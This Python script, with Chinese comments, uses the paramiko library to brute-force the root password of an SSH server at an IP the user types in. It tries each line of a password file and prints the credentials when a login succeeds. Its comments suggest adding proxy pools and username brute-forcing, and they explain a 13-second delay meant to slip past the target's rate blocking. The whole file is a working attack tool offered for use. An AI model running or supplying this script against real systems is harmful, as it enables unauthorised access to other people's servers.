import paramiko,os,time

# 可自定义密码文档
# 可在此基础上进行二次开发，列如引入代理池，增加用户名爆破等。

def ssh_check(ip,password):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print('check->' + ip + '|' + 'root' + '|' + password)
        ssh.connect(ip,'22','root',password)
        print("ip: %s ssh爆破成功 账号: root  密码: %s" %(ip,password))
        exit()
    except Exception as e:
        pass

if __name__ == '__main__':
    path=os.getcwd()
    ip=input('请输入需要爆破的ip: ')
    for password in open(path+'/ssh_pass.txt'):
        password=password.replace('\n','')
        ssh_check(ip,password)
        # 这里为了防止流量过快被对方主机拦截，所以每执行一次休眠13秒
        # 可自定义休眠时间
        time.sleep(13)
